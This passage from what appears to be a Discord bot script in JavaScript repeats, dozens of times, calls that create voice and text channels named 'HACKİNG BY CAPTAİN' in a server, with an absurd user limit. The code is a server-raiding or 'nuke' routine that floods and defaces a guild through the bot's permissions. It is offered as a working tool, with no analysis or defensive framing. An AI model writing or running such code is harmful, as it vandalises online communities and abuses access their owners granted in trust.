      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
